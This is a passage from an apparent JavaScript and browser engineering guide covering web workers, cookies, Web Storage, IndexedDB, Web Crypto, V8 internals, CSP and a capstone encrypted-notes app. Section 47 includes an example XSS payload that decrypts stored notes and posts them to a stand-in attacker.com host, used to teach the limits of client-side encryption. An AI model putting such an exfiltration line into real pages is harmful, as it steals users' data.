      const { task, resolve } = this.#queue.shift();
      worker.__resolve = resolve;
      worker.postMessage(task);
    }
  }
  #handleResult(worker, data) {
    worker.__resolve(data);
    this.#idle.push(worker);
    this.#dispatch();
  }
}
```

**RPC-style wrappers (Comlink)** eliminate the manual message-shape
boilerplate entirely by proxying method calls transparently over
`postMessage`:

```javascript
// worker.js
import * as Comlink from "comlink";
const api = { fib(n) { return n <= 1 ? n : api.fib(n - 1) + api.fib(n - 2); } };
Comlink.expose(api);

// main.js — CALLS THE WORKER LIKE A NORMAL ASYNC FUNCTION, no postMessage visible at all
import * as Comlink from "comlink";
const worker = new Worker("worker.js");
const api = Comlink.wrap(worker);
const result = await api.fib(40);   // looks synchronous-ish, actually round-trips via postMessage
```

> **Real-world example.** Figma, Photoshop's web version, and FFmpeg.wasm's
> browser build all use worker pools for exactly this reason: image/video
> processing is CPU-bound and would otherwise freeze the entire UI (including
> scroll, clicks, and rendering) for the duration of the computation.

## 42. Mini project: a multi-threaded Mandelbrot renderer (worker pool + SAB)

```javascript
// mandelbrot-worker.js — computes one horizontal STRIP of the image into shared memory
self.onmessage = ({ data: { sab, width, height, startRow, endRow, maxIter } }) => {
  const pixels = new Uint8ClampedArray(sab);
  for (let y = startRow; y < endRow; y++) {
    for (let x = 0; x < width; x++) {
      const cx = (x / width) * 3.5 - 2.5;
      const cy = (y / height) * 2 - 1;
      let zx = 0, zy = 0, iter = 0;
      while (zx * zx + zy * zy < 4 && iter < maxIter) {
        const xtemp = zx * zx - zy * zy + cx;
        zy = 2 * zx * zy + cy;
        zx = xtemp;
        iter++;
      }
      const idx = (y * width + x) * 4;
      const shade = (iter / maxIter) * 255;
      pixels[idx] = pixels[idx + 1] = pixels[idx + 2] = shade;
      pixels[idx + 3] = 255;
    }
  }
  self.postMessage({ startRow, endRow });   // just a completion signal — pixel data is ALREADY
};                                            // in the shared buffer, no copy needed back

// main.js — splits the image into N horizontal strips, one per worker, writing
// directly into one SharedArrayBuffer (requires COOP/COEP headers, see §39)
async function renderMandelbrot(canvas, maxIter = 300) {
  const { width, height } = canvas;
  const sab = new SharedArrayBuffer(width * height * 4);
  const workerCount = navigator.hardwareConcurrency || 4;
  const rowsPerWorker = Math.ceil(height / workerCount);

  const jobs = Array.from({ length: workerCount }, (_, i) => {
    const worker = new Worker("mandelbrot-worker.js");
    const startRow = i * rowsPerWorker;
    const endRow = Math.min(startRow + rowsPerWorker, height);
    return new Promise((resolve) => {
      worker.onmessage = () => { worker.terminate(); resolve(); };
      worker.postMessage({ sab, width, height, startRow, endRow, maxIter });
    });
  });

  await Promise.all(jobs);   // all strips computed IN PARALLEL across real CPU cores
  const imageData = new ImageData(new Uint8ClampedArray(sab), width, height);
  canvas.getContext("2d").putImageData(imageData, 0, 0);
}
```

On an 8-core machine this renders roughly 8x faster than a single-threaded
loop, and — critically — the main thread never blocks, so the page stays
scrollable and responsive throughout the entire computation, unlike running
the same loop directly in a `<script>`.

---

# Part VII — Client-side storage and encryption

## 43. Cookies in depth: attributes, `HttpOnly`/`Secure`/`SameSite`

Cookies are the oldest browser storage mechanism and the only one
**automatically sent with every matching HTTP request** — which is exactly
what makes them right for session tokens and wrong for anything large or
non-auth-related (they add latency to every single request, including ones
for images and static assets).

```javascript
document.cookie = "theme=dark; max-age=31536000; path=/; SameSite=Lax";
// document.cookie is a deceptively simple-looking API for a genuinely
// weird format: reading it returns ALL cookies as one semicolon-joined
// string; writing it sets exactly ONE cookie per call.
```

Security-relevant attributes, set by the **server** (never fully trustworthy
if set only from JS, since JS-set cookies can't set `HttpOnly` on
themselves):

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/

HttpOnly   -> JS (document.cookie) CANNOT read this cookie at all — the single
              most important XSS mitigation for session tokens: even a full
              XSS payload cannot exfiltrate an HttpOnly cookie via JS.
Secure     -> only sent over HTTPS, never plaintext HTTP.
SameSite=Strict -> never sent on cross-site requests, even top-level navigation
                     from an external link (strongest CSRF protection, but
                     breaks "click an email link and stay logged in" flows).
SameSite=Lax    -> sent on top-level cross-site navigation (clicking a link)
                     but NOT on cross-site subrequests (images, fetches,
                     iframes) — the modern browser DEFAULT, a reasonable
                     CSRF/usability balance.
SameSite=None   -> sent on all cross-site requests; REQUIRES Secure — needed
                     for legitimate third-party embeds (payment widgets,
                     SSO iframes), but is exactly the setting that enables
                     cross-site tracking, which is why browsers are
                     progressively restricting third-party cookies entirely.
```

> **War story.** An app stored its auth token in `localStorage` "for easy JS
> access" instead of an `HttpOnly` cookie. A single stored-XSS bug in an
> unrelated comment-rendering feature let an attacker's script read
> `localStorage.authToken` directly and exfiltrate it to an external server
> — full account takeover from one XSS bug, because nothing stood between
> the attacker's injected script and the token. An `HttpOnly` cookie would
> have made that specific token structurally unreadable by the same
> injected script, containing the blast radius to whatever the XSS could do
> live in the page, not a portable stolen credential.

## 44. `localStorage` and `sessionStorage`: API, quotas, pitfalls

Both are part of the **Web Storage API**, sharing the same simple key-value
string interface, and are **NOT sent with HTTP requests** (unlike cookies) —
purely client-side, only ever read by JS explicitly.

```javascript
localStorage.setItem("theme", "dark");     // persists across tabs, browser restarts, forever
localStorage.getItem("theme");             // "dark"
localStorage.removeItem("theme");
localStorage.clear();                       // wipes EVERYTHING for this origin

sessionStorage.setItem("draft", "hello");  // scoped to ONE TAB, cleared when that tab closes
                                             // (a NEW tab to the same site, even same URL,
                                             // gets a fresh, empty sessionStorage)
```

Real gotchas engineers hit repeatedly:

- **Synchronous, main-thread blocking**: every `getItem`/`setItem` call is
  synchronous disk I/O on the main thread — storing large values or calling
  it in a hot loop measurably janks the page. There is no async Web Storage
  API; if you need async, that's a signal to use IndexedDB (§45) instead.
- **Strings only**: `setItem` silently coerces non-strings via
  `String(value)` — storing an object without `JSON.stringify` first stores
  the useless literal string `"[object Object]"`.
- **~5-10MB quota per origin** (varies by browser), and exceeding it throws
  a `QuotaExceededError` you must catch explicitly.
- **Not available in all contexts**: throws in some sandboxed iframes and
  in Safari's Private Browsing mode (historically silently no-oped, now
  throws) — always wrap in `try/catch` for a library meant to run broadly.
- **Never store secrets in plaintext**: any XSS on the page can read
  `localStorage` directly — see §47 for what this specifically does and
  doesn't rule out.

```javascript
function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
    return true;
  } catch (err) {
    if (err.name === "QuotaExceededError") console.warn("Storage full");
    return false;
  }
}
```

## 45. IndexedDB: transactional storage for structured, larger data

IndexedDB is a full **asynchronous, transactional, indexed** database
built into the browser — the right tool once data outgrows Web Storage's
5-10MB string-only model (offline app data, cached API responses, encrypted
blobs from §46-48).

```javascript
function openDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open("notes-app", 1);
    req.onupgradeneeded = (e) => {
      const db = e.target.result;
      const store = db.createObjectStore("notes", { keyPath: "id" });
      store.createIndex("by-date", "createdAt");   // queryable secondary index
    };
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
}

async function addNote(db, note) {
  return new Promise((resolve, reject) => {
    const tx = db.transaction("notes", "readwrite");
    tx.objectStore("notes").add(note);
    tx.oncomplete = () => resolve();
    tx.onerror = () => reject(tx.error);
  });
}

async function getAllNotesSortedByDate(db) {
  return new Promise((resolve, reject) => {
    const tx = db.transaction("notes", "readonly");
    const index = tx.objectStore("notes").index("by-date");
    const results = [];
    index.openCursor().onsuccess = (e) => {
      const cursor = e.target.result;
      if (cursor) { results.push(cursor.value); cursor.continue(); }
      else resolve(results);
    };
    tx.onerror = () => reject(tx.error);
  });
}
```

The raw callback-based API is notoriously verbose — in real projects, wrap
it with a promise-based library (`idb` is the standard choice) rather than
hand-rolling this every time; the example above shows what that library is
doing underneath so debugging a leaked transaction or a version-upgrade bug
isn't a black box.

## 46. The Web Crypto API: hashing, AES-GCM, key derivation, asymmetric crypto

`crypto.subtle` (**SubtleCrypto**) is the browser's native, hardware-backed
cryptography API — always prefer it over any pure-JS crypto library for
primitives it supports, both for correctness (no re-implemented, easy-to-
get-wrong primitives) and speed (native code, sometimes hardware-accelerated).

**Hashing** (one-way, for integrity checks and password-adjacent use —
never for storing passwords directly, see PBKDF2 below):

```javascript
async function sha256(text) {
  const data = new TextEncoder().encode(text);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  return Array.from(new Uint8Array(hashBuffer))
    .map((b) => b.toString(16).padStart(2, "0")).join("");
}
await sha256("hello");  // "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
```

**Symmetric encryption (AES-GCM)** — the standard choice for encrypting data
you'll decrypt yourself later (client-side vault, encrypted notes, §48):

```javascript
async function generateKey() {
  return crypto.subtle.generateKey({ name: "AES-GCM", length: 256 }, true, ["encrypt", "decrypt"]);
}

async function encrypt(key, plaintext) {
  const iv = crypto.getRandomValues(new Uint8Array(12));   // MUST be unique per encryption
  const ciphertext = await crypto.subtle.encrypt(
    { name: "AES-GCM", iv }, key, new TextEncoder().encode(plaintext)
  );
  return { iv, ciphertext };   // store BOTH — decryption needs the exact same iv
}

async function decrypt(key, { iv, ciphertext }) {
  const plaintextBuffer = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, ciphertext);
  return new TextDecoder().decode(plaintextBuffer);
}
```

**Deriving a key from a user password (PBKDF2)** — never use a password
directly as an encryption key; derive a proper key through many hashing
iterations to make brute-forcing expensive:

```javascript
async function deriveKeyFromPassword(password, salt) {
  const keyMaterial = await crypto.subtle.importKey(
    "raw", new TextEncoder().encode(password), "PBKDF2", false, ["deriveKey"]
  );
  return crypto.subtle.deriveKey(
    { name: "PBKDF2", salt, iterations: 600_000, hash: "SHA-256" },  // OWASP 2023+ minimum
    keyMaterial,
    { name: "AES-GCM", length: 256 },
    true,
    ["encrypt", "decrypt"]
  );
}
```

**Asymmetric crypto (ECDSA for signing, RSA-OAEP/ECDH for key exchange)** —
for verifying authenticity or exchanging a symmetric key without ever
transmitting it:

```javascript
async function signMessage(privateKey, message) {
  const signature = await crypto.subtle.sign(
    { name: "ECDSA", hash: "SHA-256" }, privateKey, new TextEncoder().encode(message)
  );
  return signature;
}
async function verifySignature(publicKey, signature, message) {
  return crypto.subtle.verify(
    { name: "ECDSA", hash: "SHA-256" }, publicKey, signature, new TextEncoder().encode(message)
  );
}
```

## 47. What client-side encryption can't protect against: the XSS threat model

This is the section engineers skip and then get burned by. Client-side
encryption is real cryptography — AES-GCM via `SubtleCrypto` is not "fake"
— but its **threat model is narrower than people assume**, and
misunderstanding the boundary leads to false confidence.

**What it DOES protect against**: someone with direct access to the raw
storage (a stolen device's disk, a rogue browser extension without script
injection, an attacker who dumps IndexedDB/localStorage files offline)
seeing your plaintext data. If the ciphertext leaks but the key doesn't,
the data is genuinely unreadable.

**What it does NOT protect against**: **if an attacker can run JavaScript in
your page's origin (XSS), the encryption is worthless**, because:

```
1. Your page's JS needs the encryption key to decrypt data for the user to
   see it.
2. An XSS payload runs with the EXACT SAME privileges as your legitimate
   JS — it can call the same crypto.subtle functions, read the same
   in-memory key variable, or simply wait for YOUR code to decrypt the data
   and then read the plaintext result directly out of the DOM or a JS variable.
3. There is no way to keep a secret from code running in the same origin —
   sandboxing is per-ORIGIN (§18), not per-script-tag.
```

```javascript
// This "protects" data from someone reading raw localStorage bytes...
const encrypted = await encrypt(key, sensitiveNote);
localStorage.setItem("note", JSON.stringify(encrypted));

// ...but an XSS payload just does this instead, using YOUR OWN decrypt function:
const stolen = await decrypt(window.appEncryptionKey, JSON.parse(localStorage.note));
fetch("https://attacker.com/steal", { method: "POST", body: stolen });
// No cryptographic weakness was exploited here — the attacker simply ran
// code with the same permissions your app already had.
```

**The correct mental model**: client-side encryption's realistic value is
**protecting data at rest against non-script-execution threats** —
untrusted storage/sync providers, device theft, a browser extension with
storage access but not script-injection into your origin, or a
zero-knowledge architecture where *even your own server* should never see
plaintext (password managers, encrypted note apps). It is **not** a defense
against XSS — that defense is CSP, output encoding, and avoiding
`innerHTML`/`eval` with untrusted input, full stop. Treat client-side
encryption and XSS prevention as two separate, complementary controls, never
as substitutes for each other.

## 48. Mini project: an encrypted notes app (Web Crypto + IndexedDB)

Combining §45 (IndexedDB) and §46 (Web Crypto) into a zero-knowledge-style
notes app: the server (or sync provider) only ever sees encrypted blobs.

```javascript
class EncryptedNotesStore {
  #db; #key;

  async init(password) {
    this.#db = await openDB();   // from §45
    const salt = await this.#getOrCreateSalt();
    this.#key = await deriveKeyFromPassword(password, salt);   // from §46
  }

  async #getOrCreateSalt() {
    let salt = localStorage.getItem("salt");
    if (!salt) {
      const bytes = crypto.getRandomValues(new Uint8Array(16));
      salt = btoa(String.fromCharCode(...bytes));
      localStorage.setItem("salt", salt);   // salt is NOT secret, safe to store plainly
    }
    return Uint8Array.from(atob(salt), (c) => c.charCodeAt(0));
  }

  async saveNote(id, plaintext) {
    const { iv, ciphertext } = await encrypt(this.#key, plaintext);
    await addNote(this.#db, {
      id,
      iv: Array.from(iv),
      ciphertext: Array.from(new Uint8Array(ciphertext)),
      createdAt: Date.now(),
    });
  }

  async loadNote(record) {
    return decrypt(this.#key, {
      iv: new Uint8Array(record.iv),
      ciphertext: new Uint8Array(record.ciphertext).buffer,
    });
  }
}

// usage
const store = new EncryptedNotesStore();
await store.init("correct horse battery staple");
await store.saveNote("note-1", "Meet at the docks, midnight.");
```

If this synced `ciphertext`/`iv`/`salt` to a server, that server (or anyone
who breaches it) would see only opaque bytes — but per §47, this app is
still fully readable by any successful XSS against its own origin, since the
derived key lives in that origin's memory the moment the user's password is
entered. A production version would add a strict CSP (§51) as the actual
defense against that scenario, not more crypto.

---

# Part VIII — Expert: engine internals and browser security

## 49. Inside V8: parsing, Ignition bytecode, TurboFan, hidden classes, inline caches

V8's pipeline, from source text to fast machine code:

```
Source -> Scanner/Parser -> AST -> Ignition (bytecode interpreter)
                                        │
                              runtime profiles hot functions
                                        ▼
                          Sparkplug (fast baseline JIT, no optimization)
                                        │
                              still hot + type-stable?
                                        ▼
                     TurboFan (optimizing JIT: inlining, type
                     specialization, dead code elimination)
                                        │
                        assumption violated at runtime?
                                        ▼
                          DEOPTIMIZATION back to Ignition bytecode
```

V8 never compiles everything to optimized machine code upfront — that would
make page load slow for code that runs once. Instead it starts interpreting
immediately (fast startup) and only invests optimization effort in functions
proven "hot" by actual runtime execution counts.

**Hidden classes (Shapes/Maps internally)**: V8 doesn't treat JS objects as
generic hash maps — it dynamically creates hidden internal "classes"
describing an object's shape (which properties, in which order, what
types), and objects with the same shape share the same hidden class. This
is why **adding properties to an object in a consistent order** across many
instances is measurably faster than adding them inconsistently:

```javascript
// FAST: both objects get the SAME hidden class (same properties, same order)
function makePointGood(x, y) { return { x, y }; }
const p1 = makePointGood(1, 2);
const p2 = makePointGood(3, 4);   // shares p1's hidden class — V8 can optimize property access

// SLOW: different construction order/shape per object forces V8 to create
// and track SEPARATE hidden classes, defeating this optimization entirely
const p3 = {}; p3.x = 1; p3.y = 2;
const p4 = {}; p4.y = 4; p4.x = 3;   // different insertion order -> different hidden class
```

**Inline caches (ICs)**: at each property-access call site, V8 remembers
which hidden class it last saw and caches the exact memory offset for that
property — subsequent calls at the same call site with the same-shaped
object skip the lookup entirely ("monomorphic" — fastest). A call site that
sees many different shapes ("megamorphic") loses this optimization and falls
back to a slower generic lookup — another concrete reason consistent object
shapes matter for hot code paths.

## 50. Garbage collection and memory leaks in real JS apps

V8 uses a **generational garbage collector**, based on the empirical
observation that most objects die young: two heap generations, collected
with different strategies.

```
Young generation (small, "Scavenger" GC — fast, frequent)
  - new objects allocated here first
  - most die almost immediately (a temporary object in a function call) ->
    cheap to collect because most of the generation IS garbage
  - objects that SURVIVE a couple of scavenges get PROMOTED to:

Old generation (large, "Mark-Sweep-Compact" GC — slower, less frequent)
  - long-lived objects: app state, caches, closures held for a page's lifetime
  - collected less often since triggering a full mark-sweep is expensive
```

**Memory leaks in JS** aren't "forgotten `free()`" bugs (there's no manual
free) — they're **references you didn't mean to keep**, which prevent the
GC from ever considering an object garbage. The recurring real-world
patterns:

```javascript
// 1. Detached DOM nodes: removing an element from the document but keeping
//    a JS reference to it anywhere (a cache, an event-handler closure) keeps
//    its ENTIRE subtree alive in memory even though it's invisible.
const detachedCache = [];
function removeAndLeak(el) {
  el.remove();               // gone from the visible DOM...
  detachedCache.push(el);    // ...but still alive in memory via this array
}

// 2. Forgotten event listeners / timers holding closures over large state
function setupLeak(largeData) {
  window.addEventListener("resize", () => console.log(largeData.length));
  // if this component is ever "destroyed" without removeEventListener,
  // `largeData` is held alive forever by the still-registered listener
}

// 3. Growing caches/maps with no eviction — a Map that only ever grows
//    is a slow, "successful" memory leak by design, just not called one
const cache = new Map();
function memoize(key, computeFn) {
  if (!cache.has(key)) cache.set(key, computeFn());   // never evicted -> unbounded growth
  return cache.get(key);
}
```

Diagnosing leaks with DevTools: **Memory panel → take a heap snapshot →
perform the suspected leaking action several times → take another snapshot
→ use "Comparison" view** to see which object types grew between snapshots
that shouldn't have — a detached `HTMLDivElement` count climbing steadily is
the single most common finding in real leak hunts.

## 51. Browser security internals: CSP, sandboxing, Spectre, site isolation

**Content Security Policy (CSP)** is an HTTP response header that
whitelists exactly where scripts/styles/frames/etc. are allowed to load
from — the actual, effective defense against XSS that §47 pointed to,
because even a successful HTML-injection can't execute a `<script>` tag or
inline handler the policy doesn't permit:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com;
                          object-src 'none'; base-uri 'self'; frame-ancestors 'none'

default-src 'self'      -> only load resources from this same origin by default
script-src ... (no 'unsafe-inline')  -> inline <script> tags AND inline event
                                          handlers (onclick="...") are BLOCKED —
                                          this alone defeats the majority of
                                          real-world reflected/stored XSS payloads
object-src 'none'       -> blocks <object>/<embed>, a historical plugin-based
                              XSS vector
frame-ancestors 'none'  -> prevents this page from being framed by anyone
                              (clickjacking defense, replaces the older
                              X-Frame-Options header)
```

**Renderer sandboxing** (§18) restricts what a compromised renderer process
can do at the OS level — Chrome's sandbox on Linux uses `seccomp-bpf` to
filter which syscalls a renderer can even make, so exploiting a JS engine
bug doesn't automatically grant filesystem/network access; the exploit would
also need a *separate* sandbox-escape bug.

**Spectre** (2018) demonstrated that speculative execution — a CPU
performance optimization present in virtually all modern processors — could
be abused to read memory across security boundaries *within the same
process* via precise timing measurements, defeating purely software-level
isolation like "different JS objects can't see each other's data." Browsers'
actual mitigation wasn't a JS-level patch (the leak is a CPU hardware
behavior, not a JS bug) but **process-level isolation**: site isolation
(§18) ensures cross-origin data physically lives in a different process
with its own separate memory space, so even a successful Spectre read from
within a malicious page's renderer process cannot reach another origin's
data — it was never mapped into that process's address space at all. This
is also why `SharedArrayBuffer`/`Atomics` (§39, which provide the
high-resolution shared-memory timer Spectre-style attacks need) stay
disabled unless a page explicitly opts into cross-origin isolation.

---

# Part IX — Capstone

## 52. Capstone: an offline-first, multi-threaded, end-to-end-encrypted notes PWA

Architecture combining nearly every part of this guide into one app:

```
┌──────────────────────────────────────────────────────────────────┐
│  Main thread (Part I-II: app logic, Part V: rendering)             │
│   - Signal/VDOM-based UI (§33) renders the notes list              │
│   - On save: calls into a Worker Pool (§41) for encryption          │
│     so a large note never blocks a keystroke's UI update            │
├──────────────────────────────────────────────────────────────────┤
│  Crypto Worker (Part VI, VII: §38, §46)                             │
│   - Owns the derived AES-GCM key (Part VII §46) — kept OUT of the    │
│     main thread's global scope specifically to shrink the window     │
│     an XSS payload could reach it (defense in depth, NOT a fix —     │
│     §47's XSS caveat still fully applies since a compromised main    │
│     thread can still just ASK this worker to encrypt/decrypt for it) │
│   - Encrypts/decrypts notes via postMessage RPC (Comlink-style, §41) │
├──────────────────────────────────────────────────────────────────┤
│  IndexedDB (§45)                                                     │
│   - Stores ONLY ciphertext + iv, keyed by note id                   │
├──────────────────────────────────────────────────────────────────┤
│  Service Worker (§40)                                                │
│   - Precaches the app shell -> works fully offline                  │
│   - Background-syncs encrypted blobs to a server when connectivity   │
│     returns, using the Background Sync API                          │
├──────────────────────────────────────────────────────────────────┤
│  Server (Part IV: HTTP)                                              │
│   - Receives and stores ONLY ciphertext — genuinely zero-knowledge:  │
│     a server breach exposes no readable note content                │
│   - Response headers set Content-Security-Policy (§51),              │
│     Cross-Origin-Opener-Policy + Cross-Origin-Embedder-Policy (§39)  │
│     to enable SharedArrayBuffer if the crypto worker pool needs it   │
│     for large-note streaming encryption                              │
└──────────────────────────────────────────────────────────────────┘
```

Build order that exercises every Part in sequence:

1. **Part I-II**: the note data model, an async save/load API with a task
   queue limiting concurrent encrypt operations.
2. **Part III**: verify the app's DOM updates don't force synchronous
   layout on every keystroke (Performance panel check, §24).
3. **Part IV**: the sync-to-server `fetch` client, with retry/backoff (§31)
   for flaky connectivity — exactly the resilient client built in §31.
4. **Part V**: render the notes list with a signal-based or VDOM approach
   (§33) so typing in one note never re-renders the whole list.
5. **Part VI**: move encryption into a dedicated worker (§38, §41) so a
   large note's encryption never drops a keystroke frame.
6. **Part VII**: derive the key from the user's password (§46), store only
   ciphertext in IndexedDB (§45), and register the Service Worker (§40) for
   offline capability.
7. **Part VIII**: set a strict CSP (§51) as the actual XSS defense per
   §47's threat-model lesson, and heap-snapshot-check (§50) that closing a
   note view doesn't leak its decrypted plaintext via a lingering closure.

This is deliberately the same shape as real production apps (Signal's web
client, Standard Notes, Bitwarden's web vault) — zero-knowledge encryption,
offline-first via Service Worker, and worker-offloaded crypto are not
academic exercises, they're the actual architecture of every serious
client-side-encrypted web app shipping today.

---

## Appendix A: Event-loop task-ordering cheat sheet

```
Per event loop turn:
1. Execute ONE task from the macrotask queue (a whole <script>, a setTimeout
   callback, a UI event handler, an I/O completion)
2. Drain the ENTIRE microtask queue (Promise .then/.catch/.finally callbacks,
   queueMicrotask, async/await resumptions) — including any NEW microtasks
   queued by microtasks that just ran
3. If it's time for a frame: run requestAnimationFrame callbacks, then
   style/layout/paint (Part III)
4. Repeat from step 1

Ordering priority, highest to lowest:
  synchronous code  >  microtasks (Promises)  >  requestAnimationFrame  >
  macrotasks (setTimeout, I/O, most events)  >  requestIdleCallback
```

## Appendix B: Storage options comparison table

| | Sent with HTTP requests | Sync/Async | Capacity | Scope | Best for |
|---|---|---|---|---|---|
| Cookies | Yes, automatically | Sync (`document.cookie`) | ~4KB | Configurable via `Domain`/`Path` | Auth tokens (as `HttpOnly`), small server-needed flags |
| `localStorage` | No | Sync | ~5-10MB | Per-origin, persists forever | Small persistent client-only prefs |
| `sessionStorage` | No | Sync | ~5-10MB | Per-tab, per-origin, dies with tab | Per-tab draft/wizard state |
| IndexedDB | No | Async | Large (browser-managed, often 100s of MB+) | Per-origin, persists | Structured/large offline data, encrypted blobs |
| Cache API | No | Async | Large, shares quota with IndexedDB | Per-origin, managed by Service Worker | Cached network responses for offline use |
| In-memory (JS variable) | No | Sync | Limited by heap | Dies on page reload/navigation | Secrets you deliberately want to NOT persist |

## Appendix C: Web Crypto API cheat sheet

| Need | API call |
|---|---|
| Hash data (integrity, not passwords) | `crypto.subtle.digest("SHA-256", data)` |
| Generate a random symmetric key | `crypto.subtle.generateKey({name:"AES-GCM", length:256}, ...)` |
| Encrypt/decrypt with a symmetric key | `crypto.subtle.encrypt/decrypt({name:"AES-GCM", iv}, key, data)` |
| Derive a key from a password | `crypto.subtle.deriveKey({name:"PBKDF2", salt, iterations, hash}, ...)` |
| Generate cryptographically secure randomness | `crypto.getRandomValues(new Uint8Array(n))` — never `Math.random()` for security |
| Sign/verify (authenticity) | `crypto.subtle.sign/verify({name:"ECDSA", hash:"SHA-256"}, key, data)` |
| Generate a UUID | `crypto.randomUUID()` |

## Appendix D: Glossary

- **Realm** — an isolated JS execution environment with its own global
  object, call stack, and event loop (a tab, an iframe, or a worker each get
  their own).
- **Hidden class / Shape** — V8's internal representation of an object's
  property layout, used to make property access fast for objects with
  consistent shapes (§49).
- **Structured clone** — the copying algorithm used by `postMessage`,
  `structuredClone()`, and IndexedDB, supporting most built-in types but not
  functions or DOM nodes (§38).
- **Cross-origin isolation** — the `COOP`+`COEP` header combination required
  to re-enable `SharedArrayBuffer` after the 2018 Spectre-driven lockdown
  (§39).
- **Hydration** — attaching client-side interactivity to server-rendered
  static HTML without re-creating the DOM (§34).
- **Jank** — a dropped or late frame, perceived as visual stutter, caused by
  exceeding the ~16.6ms frame budget (§22).

## Appendix E: Further reading

Organized to mirror the guide's Parts, so you can go deep on exactly the
topic you just read, rather than a flat undifferentiated list.

### E.1 — Language fundamentals (Part I–II)

- **ECMA-262** (`tc39.es/ecma262`) — the actual, current ECMAScript
  specification. Dense, but it is the *only* fully authoritative source when
  MDN's prose and a language edge case disagree; worth learning to navigate
  even if you never read it cover to cover.
- **TC39 proposals repo** (`github.com/tc39/proposals`) — track upcoming
  language features by stage (0–4) before they ship; the fastest way to know
  whether a syntax you saw in a blog post is real, experimental, or
  abandoned.
- **MDN JavaScript Guide & Reference** (`developer.mozilla.org/en-US/docs/Web/JavaScript`)
  — the canonical day-to-day reference for every built-in, operator, and
  method in Part I; also the best browser-compatibility data source (the
  "Browser compatibility" table at the bottom of every page).
- **"You Don't Know JS (Yet)"** by Kyle Simpson — a free, open-source book
  series (`github.com/getify/You-Dont-Know-JS`) that goes deeper than this
  guide specifically on scope/closures, `this`/prototypes, and async — the
  natural next stop after Part I-II if any single chapter here felt rushed.
- **"Eloquent JavaScript"** by Marijn Haverbeke (`eloquentjavascript.net`,
  free online) — a slower-paced, project-driven alternative path through the
  same fundamentals, with a stronger emphasis on writing real programs early.
- **2ality** blog by Dr. Axel Rauschmayer (`2ality.com`) — the most reliable
  ongoing source of precise, spec-accurate deep dives on individual language
  features (destructuring, iterators, generators, `Symbol.iterator`) as they
  ship.
- **"Tasks, microtasks, queues and schedules"** by Jake Archibald
  (`jakearchibald.com`) — the single canonical explainer for §12's
  event-loop task/microtask ordering, written by a browser engineer who
  worked on the spec text itself; read this if §12's ASCII diagram wasn't
  enough.

### E.2 — Browser internals and rendering (Part III, V)

- **"How Browsers Work: Behind the scenes of modern web browsers"** by Tali
  Garsiel and Paul Irish (originally HTML5Rocks, mirrored on `web.dev`) —
  the classic, exhaustive walkthrough of the rendering pipeline this guide's
  §21 summarizes; covers parsing algorithms and layout in far more depth.
- **"Inside look at modern web browser"** (4-part series, Chrome team,
  `developer.chrome.com`) — walks the exact multi-process architecture from
  §18 (browser process, renderer process, compositor, GPU process) with
  diagrams from the people who built Chromium's implementation.
- **Chromium project design docs** (`chromium.org` → Developer documentation)
  — primary-source design documents for site isolation, the compositor, and
  Blink's rendering pipeline, for when a blog-post-level explanation isn't
  precise enough.
- **Mozilla Hacks** (`hacks.mozilla.org`) — Gecko/SpiderMonkey engineering
  team's own blog; the best source for *why* Firefox's engine made a
  different architectural choice than Chromium on a given feature (§19).
- **WebKit Blog** (`webkit.org/blog`) — same role for Safari/JavaScriptCore;
  cross-reference all three engine blogs when debugging a real
  cross-browser rendering discrepancy rather than guessing from behavior
  alone.
- **web.dev's Rendering Performance guide** (`web.dev` → Learn → Rendering
  Performance) — a practical companion to §21-22's layout/paint/composite
  pipeline, with more CSS-property-by-property "what triggers what" detail.

### E.3 — HTTP, networking, and browser transport (Part IV)

- **"High Performance Browser Networking"** by Ilya Grigorik — free online
  (`hpbn.co`) and in print; the definitive deep dive on TCP, TLS, HTTP/1.1,
  HTTP/2, and mobile network behavior from a browser-performance angle,
  written by a Google engineer who worked on the relevant Chrome subsystems.
- **"http2 explained"** and **"http3 explained"** by Daniel Stenberg
  (curl's author) — free ebooks (`github.com/bagder`) that go far deeper
  into the wire-level framing/multiplexing mechanics §26 only summarizes.
- **MDN HTTP docs** (`developer.mozilla.org/en-US/docs/Web/HTTP`) — the
  canonical reference for every header, status code, and caching directive
  used across Part IV.
- **web.dev's "Fast load times" guide** (`web.dev` → Learn → Performance) —
  practical resource-hint (`preconnect`/`preload`/`prefetch`) guidance
  extending §26.
- [`wiki/networking/tcp-ip/real-life-example.md`](../networking/tcp-ip/real-life-example.html)
  — this wiki's own networking companion guide for the TCP/TLS/DNS
  mechanics underneath every `fetch()` call in Part IV, in full depth.
- [`wiki/scale-perf/real-life-scale-guide.md`](../scale-perf/real-life-scale-guide.html)
  — once an endpoint built with Part IV's `fetch` patterns is live, this
  wiki's load-testing/latency-percentile guide covers how to actually
  measure and stress-test it under real traffic.

### E.4 — Concurrency and multi-threaded browser apps (Part VI)

- **MDN Web Workers API** and **MDN "Using web workers"** guide — the
  canonical reference and tutorial for §38's `postMessage`/structured-clone
  mechanics.
- **web.dev's cross-origin isolation guide** (`web.dev` → search "COOP
  COEP") — the practical, up-to-date checklist for enabling
  `SharedArrayBuffer` (§39), including common misconfigurations that leave
  it silently disabled.
- **Comlink** by Surma/GoogleChromeLabs (`github.com/GoogleChromeLabs/comlink`)
  — the actual RPC-over-`postMessage` library §41 describes the pattern of;
  read its README and source (it's small) to see the `Proxy`-based trick
  that makes worker calls look synchronous-ish.
- **Surma's blog** (`surma.dev`) — sustained, practical writing on Web
  Workers, WASM threads, and offloading architecture from one of the
  engineers who built much of the tooling in this space.
- **"Is `postMessage` slow?"** and related perf-focused posts on
  `web.dev`/`developer.chrome.com` — for when a worker-pool architecture's
  message-passing overhead itself becomes the bottleneck.

### E.5 — Client-side storage and encryption (Part VII)

- **W3C Web Cryptography API specification** (`w3.org/TR/WebCryptoAPI`) —
  the formal spec behind every `crypto.subtle` call in §46; useful for
  confirming exact algorithm parameter names/shapes across browsers.
- **MDN Web Crypto API, Web Storage API, and IndexedDB API** references —
  the day-to-day lookup for the exact method signatures used in §44-46.
- **`idb`** by Jake Archibald (`github.com/jakearchibald/idb`) — the
  de facto standard Promise-based wrapper around raw IndexedDB (§45);
